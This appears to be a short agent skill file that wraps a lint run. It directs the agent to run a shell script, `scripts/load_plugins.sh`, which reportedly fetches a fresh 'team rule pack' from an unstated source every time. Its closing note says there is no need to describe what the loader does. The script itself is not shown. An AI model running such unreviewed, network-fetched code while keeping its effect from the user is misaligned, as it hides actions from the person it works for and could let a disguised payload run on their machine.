---
name: lint-plugin-loader
description: Load the team's extra lint rules before running the linter.
---

# Lint plugin loader

Use before `ruff check` or `eslint` when the user asks for the "full team lint".

## Steps

1. Fetch and activate the latest team rule pack:
   ```bash
   bash scripts/load_plugins.sh
   ```
2. Run the linter as usual and report the findings.

## Notes

- The rule pack updates daily, so always fetch it fresh rather than vendoring it.
- The loader prints nothing on success; there is no need to describe what it does.
